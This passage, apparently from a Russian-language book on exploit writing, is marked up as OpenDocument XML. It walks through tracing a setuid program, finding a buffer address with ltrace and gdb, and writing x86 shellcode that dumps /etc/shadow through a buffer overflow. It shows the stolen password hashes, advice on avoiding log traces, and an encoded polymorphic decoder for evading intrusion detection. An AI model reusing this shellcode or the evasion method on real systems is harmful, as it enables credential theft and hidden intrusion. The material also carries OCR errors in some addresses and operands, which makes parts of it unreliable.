      <text:p text:style-name="P9"><text:span text:style-name="T12">fstat(4,</text:span><text:span text:style-name="T11">{st_mode=S_IFREG|0755,st_size=4776568, ...}) =0</text:span></text:p>
      <text:p text:style-name="P31"><text:span text:style-name="T12">read(4,</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T12">"\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\220\ <text:tab/><text:tab/><text:tab/><text:tab/>274"...,</text:span><text:span text:style-name="T11">4096) = 4096</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T11">old_mmap(NULL,1196776,PROT_READ|PROT_EXEC,MAP_PRIVATE,4,0) = <text:tab/><text:tab/></text:span><text:span text:style-name="T12"><text:tab/></text:span><text:span text:style-name="T11">0x4001c000 </text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T12">mprotect(0x40137000,</text:span><text:span text:style-name="T11">37608,PROT_NONE) = 0 </text:span></text:p>
      <text:p text:style-name="P15">old_mmap(0x40137000,24576,PROT_READ|PROT_WRITE,MAP_PRIVATE|</text:p>
      <text:p text:style-name="P30"><text:span text:style-name="T12"><text:tab/><text:tab/><text:tab/>MAP_FIXED,</text:span><text:span text:style-name="T11">4,</text:span><text:span text:style-name="T12">0</text:span><text:span text:style-name="T11">x1</text:span><text:span text:style-name="T12">1</text:span><text:span text:style-name="T11">a</text:span><text:span text:style-name="T12">000</text:span><text:span text:style-name="T11">) = 0x40137000</text:span></text:p>
      <text:p text:style-name="P15">old_mmap(0x4013d000,13032,PROT_READ|PROT_WRITE,MAP_PRIVATE</text:p>
      <text:p text:style-name="P30"><text:span text:style-name="T12"><text:tab/><text:tab/>|MAP_FIXED|MAP_ANONYMOUS,</text:span><text:span text:style-name="T11">-1,0) = 0x4013d000</text:span></text:p>
      <text:p text:style-name="P14">close(4)</text:p>
      <text:p text:style-name="P14">munmap(0x40018000,15646)<text:tab/><text:tab/><text:tab/>= 0</text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T11">getpid</text:span><text:span text:style-name="T12">()<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>=</text:span><text:span text:style-name="T11"> 7080</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T11">open("/etc/shadow",O_RDDONLY)</text:span><text:span text:style-name="T12"><text:tab/><text:tab/>= 4</text:span></text:p>
      <text:p text:style-name="P28"><text:span text:style-name="T11">getuid32() </text:span><text:span text:style-name="T12"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>= -1 ENOSYS</text:span></text:p>
      <text:p text:style-name="P28"><text:span text:style-name="T12"><text:tab/><text:tab/><text:tab/><text:tab/> (Function not </text:span><text:span text:style-name="T11">implemented)</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T11">getuid</text:span><text:span text:style-name="T12">()<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>= 0</text:span></text:p>
      <text:p text:style-name="P14">setuid(0)<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>= 0</text:p>
      <text:p text:style-name="P14">getgid()<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>= 0</text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T11">setgid(</text:span><text:span text:style-name="T12">0</text:span><text:span text:style-name="T11">)</text:span><text:span text:style-name="T12"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>= 0</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T12">read(4,</text:span><text:span text:style-name="T11">"root:$l$wpb5dGdg$Farrr9UreecuYfu"..., 256) = 256</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T12">_exit(0)</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T12"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T11">= ?</text:span></text:p>
      <text:p text:style-name="P11">[root@g]# </text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ</text:h>
      <text:list xml:id="list7836655320566046158" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P78">Для трассировки системных вызовов, выполненных setuid или setgid-npoграммой, необходимы привилегии суперпользователя root, так что нам пришлось работать от его имени. Это видно в трассе, когда программа устанавливает идентификаторы пользователя и группы того, кто ее вызвал.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P78">В строке 23 мы видим системный вызов <text:span text:style-name="T9">open</text:span>. Он открывает файл <text:span text:style-name="T9">/etc/shadow</text:span> и возвращает дескриптор, с помощью которого этот файл можно читать.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P78">Дескриптор 4, возвращенный функцией <text:span text:style-name="T9">оре</text:span><text:span text:style-name="T2">n</text:span><text:span text:style-name="T1">,</text:span> передается функции <text:span text:style-name="T9">read</text:span> в строке 29 для чтения 256 байтов из файла <text:span text:style-name="T9">shadow</text:span> в буфер <text:span text:style-name="T9">small</text:span>. Функция <text:span text:style-name="T9">read</text:span> получает указатель на область памяти, в которую следует поместить <text:span text:style-name="T9">х</text:span> прочитанных из файла байтов.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3">Мы собираемся написать эксплойт для этой программы, который прочтет блок данных из файла в буфер <text:span text:style-name="T9">small</text:span>, после чего выведет содержимое этого буфера на <text:span text:style-name="T9">stdout</text:span> помощью функции <text:span text:style-name="T9">write</text:span>. Следовательно, воспользовавшись переполнением буфера, мы внедрим в программу следующие две функции:</text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">r</text:span>еа<text:span text:style-name="T1">d</text:span>(&lt;дескриптор, возвращенный оре<text:span text:style-name="T1">n</text:span>&gt;,&lt;указатель на small&gt;,&lt;длина small&gt;);</text:p>
      <text:p text:style-name="P16">write(&lt;stdout&gt;,&lt;yкaзaтeль на small&gt;,&lt;длина small&gt;);</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/>Первая проблема состоит в том, что во многих программах дескрипторы открываемых файлов меняются от запуска к запуску. В данном случае мы уверены, что <text:span text:style-name="T9">open</text:span> всегда возвращает дескриптор 4, так как программа небольшая и в ней нет функций, которые в зависимости от внешних условий могут либо открыть, либо не открывать файлы перед переполнением буфера. Но, к сожалению, иногда дескриптор нужного файла заранее не известен. В таком случае мы можем проверить все дескрипторы, пока не наткнемся на подходящий.</text:p>
      <text:p text:style-name="P3">Вторая <text:span text:style-name="T1">проблема -</text:span> как получить указатель на массив <text:span text:style-name="T2">small</text:span><text:span text:style-name="T1">.</text:span> Существует много методов определения адреса этого буфера. Вы видели, что к нему обращаются функции <text:span text:style-name="T9">strcpy</text:span> и <text:span text:style-name="T9">memset</text:span>. Так воспользуемся утилитой <text:span text:style-name="T2">l</text:span><text:span text:style-name="T9">trace</text:span>, чтобы познакомиться с деталями их работы.</text:p>
      <text:p text:style-name="P5"><text:s/>1 [root@g]# <text:span text:style-name="T1">l</text:span>trace ./readshadow aa</text:p>
      <text:p text:style-name="P11"><text:s/>2<text:span text:style-name="T1"> </text:span><text:s/><text:span text:style-name="T1">__libc_start_main(0x08048610,2,0xbffffb54,0x080483e0, <text:tab/>0x080486bc, ...</text:span></text:p>
      <text:p text:style-name="P11"><text:s/>3 <text:span text:style-name="T1">__register_frame_infо(0x08048700,0x080497f4,0xbffffaf8, <text:tab/>0x4004b0f7,</text:span> 0x4004b0e0) = 0x4013c400 </text:p>
      <text:p text:style-name="P11"><text:s/>4 open("/etc/shadow", 0, 010001130340) <text:span text:style-name="T1"><text:tab/></text:span>= 3</text:p>
      <text:p text:style-name="P11"><text:s/>5 <text:span text:style-name="T1">getuid()</text:span> <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span>= 0 </text:p>
      <text:p text:style-name="P11"><text:s/>6 setuid(<text:span text:style-name="T1">0</text:span>) <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span>= 0</text:p>
      <text:p text:style-name="P11"><text:s/>7 getgid<text:span text:style-name="T1">()<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span>= 0 </text:p>
      <text:p text:style-name="P11"><text:s/>8 setgid(<text:span text:style-name="T1">0</text:span>)<text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span>= 0 </text:p>
      <text:p text:style-name="P11"><text:s/>9 strcpy(<text:span text:style-name="T1">0</text:span>xbffff9b0, "aa") <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/></text:span>= 0xbffff9b0</text:p>
      <text:p text:style-name="P11">10 <text:span text:style-name="T1">memset(0xbffff9b0,</text:span> '\000<text:span text:style-name="T1">',</text:span> 254) <text:span text:style-name="T1"><text:tab/><text:tab/></text:span>= 0xbffff9b0</text:p>
      <text:p text:style-name="P11">11 <text:span text:style-name="T1">read(3,</text:span> "root:$l$wpb5dGdg$Farrr9UreecuYfu"..., 254) =254</text:p>
      <text:p text:style-name="P11">12 <text:span text:style-name="T1">__deregister_frame_info(0x08048700,</text:span>0,0xbffffae8, 0x08048676, 3) <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>= </text:span>0x080497f4</text:p>
      <text:p text:style-name="P11">13 +++ exited (status 9) +++ </text:p>
      <text:p text:style-name="P11">14 [root@g]# </text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ</text:h>
      <text:list xml:id="list7370520744197017481" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P68">из строк 9 и 10 видно, что обращение к буферу small происходит но адресу 0xbfffi9b0. Этот же адрес мы и будем использовать в нашем shell коде.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3">Получить адрес массива <text:span text:style-name="T9">small</text:span> можно и с помощью отладчика <text:span text:style-name="T1">GDB</text:span>.</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T12"><text:s/></text:span><text:span text:style-name="T11">1 [ root</text:span><text:span text:style-name="T12">@g]# gdb -q </text:span><text:span text:style-name="T11">./</text:span><text:span text:style-name="T12">readshad</text:span><text:span text:style-name="T11">ow</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>2 (<text:span text:style-name="T1">gdb</text:span>) <text:span text:style-name="T1">b</text:span> <text:span text:style-name="T1">strcp</text:span>y </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>3 Breakpoint <text:span text:style-name="T1">1</text:span> at 0x80484d0</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>4 (gdb) r aa</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>5 Starting program: ./readshadow aa</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>6 Breakpoint 1 at 0x4009c8aa: file ../sysdeps/generic/strcpy.c <text:span text:style-name="T1"><text:tab/></text:span>line 34.</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>7 </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>8 Breakpoint 1 at, strcpy(dest=0xbffff9b0 "\001", src=0xbffffc7b <text:span text:style-name="T1"><text:tab/></text:span>"aa")<text:span text:style-name="T1"> </text:span>at ../sysdeps/generic/strcpy.c:34</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>9 34<text:span text:style-name="T1"> <text:s/></text:span><text:s/>../sysdeps/generic/strcpy.c: No such file or directory.</text:p>
      <text:p text:style-name="P11">10 (gdb)</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ</text:h>
      <text:list xml:id="list7304173222274309948" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P69">Первым делом мы устанавливаем точку прерывания на функции <text:span text:style-name="T9">strcpy</text:span> с помощью команды GDB <text:span text:style-name="T2">b</text:span><text:span text:style-name="T9"> strcpy</text:span> (строка 2). Это заставит GDB остановиться перед началом выполнение <text:span text:style-name="T9">strcpy</text:span>.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P79">Затем мы запускаем программу с аргументом <text:span text:style-name="T9">аа</text:span> (строка 4) и спустя короткое время GDB приостанавливает исполнение, наткнувшись на функцию <text:span text:style-name="T9">strcpy</text:span> (строки 6-10). GDB автоматически выводит некоторую информацию об этой функции. В частности, мы видим, что «<text:span text:style-name="T9">dest=0xbf</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T9">ff9b0</text:span>». Это и есть адрес буфера <text:span text:style-name="T9">small</text:span> Как и следовало ожидать, он совпадает с тем, что показала утилита <text:span text:style-name="T2">l</text:span><text:span text:style-name="T9">trace</text:span>.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1">Теперь, зная дескриптор файла и адрес буфера <text:span text:style-name="T9">small</text:span> в памяти, мы в состоянии полностью написать те системные вызовы, которые нужны в shell-коде:</text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">read(4, </text:span>0xbffff9b0,254);</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1">write</text:span>(l,0xbffff9b0,254)</text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"><text:s/></text:span>1 BITS 32</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>2 </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>3 хо<text:span text:style-name="T1">r</text:span> ebx,ebx </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>4 mul ebx </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>5 cdq </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>6 </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>7 mov al,0x3 </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>8 mov bl,0x4 </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>9 mov ecx,0xbffff9b0 </text:p>
      <text:p text:style-name="P11">10 mov dl,254 </text:p>
      <text:p text:style-name="P11">11 int 0x80 </text:p>
      <text:p text:style-name="P11">12 </text:p>
      <text:p text:style-name="P11">13 mov al,0x4 </text:p>
      <text:p text:style-name="P11">14 mov bl,0xl </text:p>
      <text:p text:style-name="P11">15 int 0x80 </text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ</text:h>
      <text:list xml:id="list7420037927955929252" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P70">Поскольку обоим системным вызовам <text:span text:style-name="T9">read</text:span> и <text:span text:style-name="T9">write</text:span> нужно три аргумента, то мы с самого начала обнуляем регистры ЕВХ, ЕАХ и EDX.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P70">Далее в регистр AL заносится номер системного вызова <text:span text:style-name="T9">read</text:span> (строка 7), в регистр BL - дескриптор интересующего нас файла, в ЕСХ - адрес буфера <text:span text:style-name="T9">small</text:span>, а в DL - число считываемых байтов. Подготовив все аргументы, можем вызывать ядро.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P70">После того как вызов <text:span text:style-name="T9">read</text:span> прочтет 254 байта из файла <text:span text:style-name="T9">/etc/shadow</text:span>, мы можем воспользоваться вызовом <text:span text:style-name="T9">write</text:span>, чтобы вывести их на <text:span text:style-name="T9">stdout</text:span>. Сначала занесем в AL номер этого системного вызова. Поскольку аргументы <text:span text:style-name="T9">write</text:span> почти такие же, как у <text:span text:style-name="T9">read</text:span>, нам нужно лишь изменить содержимое регистра <text:soft-page-break/>BL. В строке 14 мы заносим туда 1 - дескриптор <text:span text:style-name="T9">stdout</text:span>, после чего вызываем ядро.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1">Вставив этот shell-код в эксплойт для рассматриваемой программы, мы получим следующий результат:</text:p>
      <text:p text:style-name="P5">[guest@g]# ./expl.pl</text:p>
      <text:p text:style-name="P11">Новый адрес возврата: 0xbffff8c0</text:p>
      <text:p text:style-name="P5">root:$<text:span text:style-name="T1">1</text:span>$wpb5dGdg$Farrr9UreecuYfun6R0r5/:12202:0:99999:7:::</text:p>
      <text:p text:style-name="P11">bin:*:11439:0:99999:7:::</text:p>
      <text:p text:style-name="P11">daemon:*:11439:0:99999:7:::</text:p>
      <text:p text:style-name="P11">adm:*:11439:0:99999:7:::</text:p>
      <text:p text:style-name="P11">lp:*:11439:0:99999:7:::</text:p>
      <text:p text:style-name="P11">sync:qW3seJ.errvo:114 39:0:99999:7:::</text:p>
      <text:p text:style-name="P11">shutdown:*:11439:0:99999:7:::</text:p>
      <text:p text:style-name="P11">halt:*:11439:0:99999:7:::</text:p>
      <text:p text:style-name="P11">[guest@g]#</text:p>
      <text:p text:style-name="P3">В примере приведена трассировка системных вызовов, выполняемых этим shell-кодом: </text:p>
      <text:p text:style-name="P5">7726 open("/etc/shadow", 0_RDONLY) . <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/>=</text:span> 4</text:p>
      <text:p text:style-name="P11">7726 <text:span text:style-name="T1">getuid()<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>=</text:span> 0</text:p>
      <text:p text:style-name="P11">7726 setuid(<text:span text:style-name="T1">0</text:span>) <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>=</text:span> 0</text:p>
      <text:p text:style-name="P11">7726 <text:span text:style-name="T1">getgid()</text:span> <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>=</text:span> 0</text:p>
      <text:p text:style-name="P11">7726 setgid(<text:span text:style-name="T1">0</text:span>) <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>=</text:span> 0</text:p>
      <text:p text:style-name="P11">7726 <text:span text:style-name="T1">read(0,</text:span> "\n", <text:span text:style-name="T1">254</text:span>) <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>=</text:span> <text:span text:style-name="T1">1</text:span></text:p>
      <text:p text:style-name="P89">7726 <text:span text:style-name="T1">read(4,"root:$1$wpb5dGdg$Farrr90UreecuYfu</text:span>"...,<text:span text:style-name="T1">254</text:span>)<text:span text:style-name="T1">=254</text:span></text:p>
      <text:p text:style-name="P89"><text:span text:style-name="T1">7726</text:span> writ<text:span text:style-name="T1">e(1,</text:span>"root:<text:span text:style-name="T1">$1$wpb5dGdg$Farrr90UreecuYfu</text:span>"...,<text:span text:style-name="T1">254</text:span>)<text:span text:style-name="T1">= 254</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1">7726</text:span> <text:span text:style-name="T1">-</text:span>.<text:span text:style-name="T1">SIGSEGV </text:span>(S<text:span text:style-name="T1">egmentation fault</text:span>)<text:span text:style-name="T1"> --</text:span></text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ</text:h>
      <text:list xml:id="list8965017035183936839" text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P71">Оба системных вызова, встречающихся в shell-коде, успешно выполнились, как видно из строк 7 и 8. Увы, в строке 9 программа аварийно завершилась из-за ошибки доступа к памяти. Произошло это потому, что мы не вышли из программы вслед за последним системным вызовом, поэтому она продолжила выполнять код, находящийся вне нашего shell-кода.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P80">В этом shell-коде есть и еще одна проблема. Что если файл <text:span text:style-name="T9">shadow</text:span> содержит всего 100 байтов? Функция <text:span text:style-name="T9">read</text:span> в этом случае отработает нормально и вернет число прочитанных байтов. Поэтому если бы мы сделали значение, возвращенное <text:span text:style-name="T9">read</text:span>, третьим аргументом вызова <text:span text:style-name="T9">write</text:span> и добавили в конце вызов <text:span text:style-name="T2">exit</text:span><text:span text:style-name="T1">,</text:span> то shell-код всегда работал бы правильно и не приводил к сбросу памяти. Сброс <text:span text:style-name="T1">(</text:span>дамп памяти<text:span text:style-name="T1">)</text:span> происходит в случае аварийной остановки программы вследствие попытки записи данных в недоступную ей область памяти.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3">Исправленный shell-код</text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1"><text:s/></text:span>1 BITS 32</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>2 </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>3 xor ebx,ebx </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>4 mul ebx </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>5 cdq </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>6 </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>7 mov al,0x3 </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>8 </text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s/></text:span>9 mov bl, 0x4 </text:p>
      <text:p text:style-name="P11">10 mov <text:span text:style-name="T1">ecx,0xbffff9b0</text:span> </text:p>
      <text:p text:style-name="P11">11 mov dl,254 </text:p>
      <text:p text:style-name="P11">12 int 0x80 </text:p>
      <text:p text:style-name="P11">13 </text:p>
      <text:p text:style-name="P11">14 mov dl, al </text:p>
      <text:p text:style-name="P11">15 mov al,0x4 </text:p>
      <text:p text:style-name="P11">16 mov bl,0x1 </text:p>
      <text:p text:style-name="P11">17 int 0x80 </text:p>
      <text:p text:style-name="P11">18 dec bl </text:p>
      <text:p text:style-name="P11">19 mov al, 1 </text:p>
      <text:p text:style-name="P11">20 int 0x80</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ</text:h>
      <text:list xml:id="list8739223900908160978" text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P72">В строке 14 мы копируем значение, возвращенное системным вызовом <text:span text:style-name="T9">read</text:span>, в регистр DL, чтобы его можно было использовать в <text:span text:style-name="T1">качестве третьего</text:span> аргумента вызова <text:span text:style-name="T9">write</text:span>.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P81">После возврата из вызова <text:span text:style-name="T9">write</text:span> мы выполняем системный вызов <text:span text:style-name="T9">exit</text:span>(<text:span text:style-name="T1">0</text:span>) для завершения программы.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1">Результат трассировки исправленной версии.</text:p>
      <text:p text:style-name="P5">7782 open("/etc/shadow", <text:span text:style-name="T1">O</text:span>_RDONLY) <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span>= 4</text:p>
      <text:p text:style-name="P11">7782 <text:span text:style-name="T1">getuid()</text:span> <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span>= <text:span text:style-name="T1">0</text:span></text:p>
      <text:p text:style-name="P11">7782 setuid(<text:span text:style-name="T1">0</text:span>) <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span>= <text:span text:style-name="T1">0</text:span></text:p>
      <text:p text:style-name="P11">7782 <text:span text:style-name="T1">getgid()<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span>= <text:span text:style-name="T1">0</text:span></text:p>
      <text:p text:style-name="P11">7782 setgid(<text:span text:style-name="T1">0</text:span>) <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span>= <text:span text:style-name="T1">0</text:span></text:p>
      <text:p text:style-name="P11">7782 <text:span text:style-name="T1">read(0,</text:span> "\n", 254) <text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span>= 1</text:p>
      <text:p text:style-name="P89">7782 <text:span text:style-name="T1">read(0,</text:span>"root:$l$wpb5dGdg$Farrr9UreecuYfu"..., 254) = 254</text:p>
      <text:p text:style-name="P89">7782 <text:span text:style-name="T1">write(1,</text:span>"root:$l$wpb5dGdg$Farrr9UreecuYfu"...,254) = 254</text:p>
      <text:p text:style-name="P11">7782 <text:span text:style-name="T1">_exit(0)</text:span></text:p>
      <text:p text:style-name="P3">Вызовы <text:span text:style-name="T9">read</text:span> и <text:span text:style-name="T9">write</text:span> выглядят точно так же, но мы знаем, что на самом деле число 254, переданное <text:span text:style-name="T9">write</text:span> (строка 8), - это значение, возвращенное вызовом <text:span text:style-name="T9">read</text:span> в строке 7. Кроме того, программа корректно завершается с помощью <text:span text:style-name="T9">exit</text:span>, так что дампа памяти больше не происходит. Это важно, поскольку аварийное завершение программы протоколируется в журналах, выдавая тем самым ваше присутствие.</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Кодирование shell-кода</text:h>
      <text:p text:style-name="P3">Суть кодирования shell-кодов в том, что эксплойт кодирует shell-код и в его начале помещает декодер. Во время выполнения декодер восстанавливает исходный вид <text:soft-page-break/>shell-кода и запускает его на выполнение. </text:p>
      <text:p text:style-name="P3">Если эксплойт всякий раз кодирует shell-код с помощью нового значения и создает декодер «на лету», то полезная нагрузка становится полиморфной, и мало найдется IDS, способных ее распознать. Некоторые дополнительные модули к системам IDS умеют декодировать закодированный shell-код, по они потребляют слишком много процессорного времени и встречаются в сети Интернет нечасто.</text:p>
      <text:p text:style-name="P3">Предположим, что для кодирования к каждому байту shell-кода прибавляется случайное число. На С алгоритм кодирования выглядел бы так: </text:p>
      <text:p text:style-name="P5">int number = get_random number();</text:p>
      <text:p text:style-name="P11"><text:s/><text:span text:style-name="T1"><text:s/></text:span>for (count = 0; count &lt; <text:span text:style-name="T1">strlen</text:span>(<text:span text:style-name="T1">shell</text:span>code); count<text:span text:style-name="T1">++</text:span>) <text:span text:style-name="T1">{</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s text:c="4"/>shellcode</text:span>[count<text:span text:style-name="T1">]</text:span> <text:span text:style-name="T1">+=</text:span> number;</text:p>
      <text:p text:style-name="P14"><text:s text:c="2"/>}</text:p>
      <text:p text:style-name="P3">Декодер, который должен быть написан на ассемблере, вычитает то же самое число из каждого байта shell-кода, после чего переходит на первый байт и начинает исполнение. Алгоритм выглядит следующим образом:</text:p>
      <text:p text:style-name="P5">for (count = 0; count &lt; strlen(shellcode); count++) {</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T1"><text:s text:c="2"/></text:span>shellcode[count] -= number;</text:p>
      <text:p text:style-name="P14">}</text:p>
      <text:p text:style-name="P3">Декодер, реализованный на ассемблере:</text:p>
      <text:p text:style-name="P5"><text:s/>1 BITS 32 </text:p>
      <text:p text:style-name="P11"><text:s/>2 </text:p>
      <text:p text:style-name="P11"><text:s/>3 jmp short go</text:p>
      <text:p text:style-name="P11"><text:s/>4 next<text:span text:style-name="T1">:</text:span> </text:p>
      <text:p text:style-name="P11"><text:s/>5 </text:p>
      <text:p text:style-name="P11"><text:s/>6 pop esi </text:p>
      <text:p text:style-name="P11"><text:s/>7 xor ecx,ecx </text:p>
      <text:p text:style-name="P11"><text:s/>8 mov cl,<text:span text:style-name="T18">0</text:span> </text:p>
      <text:p text:style-name="P11"><text:s/>9 change: </text:p>
      <text:p text:style-name="P11">10 sub byte [esi+ecx-1],<text:span text:style-name="T18">0 </text:span></text:p>
      <text:p text:style-name="P11">11 dec cl </text:p>
      <text:p text:style-name="P11">12 jnz change </text:p>
      <text:p text:style-name="P11">13 jmp short ok </text:p>
      <text:p text:style-name="P11">14 go:</text:p>
      <text:p text:style-name="P11">15 call next </text:p>
      <text:p text:style-name="P11">16 ok:</text:p>
      <text:h text:style-name="Heading_20_3" text:outline-level="3">Анализ </text:h>
      <text:list xml:id="list6508125957976479843" text:style-name="L8">
        <text:list-item>
          <text:p text:style-name="P73">Значение 0 в строке 8 должно быть заменено эксплойтом во время выполнения на истинную длину shell-кода. Вместо значения 0 в строке 10 эксплойт должен подставить то число, которым shell-код был закодирован. Ниже мы обсудим, как это делается. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P73">Метка ok: в строке 16 относится к началу закодированного (и впоследствии раскодированного) shell-кода. Это связано с тем, что декодер помещается непосредственно перед shell-кодом, так что в памяти они выглядят так: </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P51">[ДЕКОДЕР][ЗАКОДИРОВАННЫЙ SHELL-КОД] </text:p>
      <text:list xml:id="list193640740153497" text:continue-numbering="true" text:style-name="L8">
        <text:list-item>
          <text:p text:style-name="P73">Для получения начального адреса shell-кода в регистре ESI декодер применяет технику jmp/call. Имея этот адрес, можно последовательно модифицировать все байты shell-кода. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P73">Процедура декодирования происходит в цикле, который начинается с метки <text:span text:style-name="T9">change</text:span>. Перед началом цикла мы помещаем длину shell-кода в регистр CL (строка 8). После каждой итерации значение CL уменьшается на единицу (строка 11). Когда CL станет равен 0, команда JNZ (перейти, если не ноль) уже не будет выполняться, цикл завершится. Внутри цикла мы вычитаем известное значение из байта, расположенного со смещением ЕСХ<text:span text:style-name="T1"> - </text:span>1 от адреса начала shell-кода, хранящегося в регистре ESI. Поскольку в начальный момент ЕСХ содержал длину shell-кода и уменьшается на 1 на каждой итерации, то мы таким образом обработаем все байты shell-кода. </text:p>
        </text:list-item>
        <text:list-item>
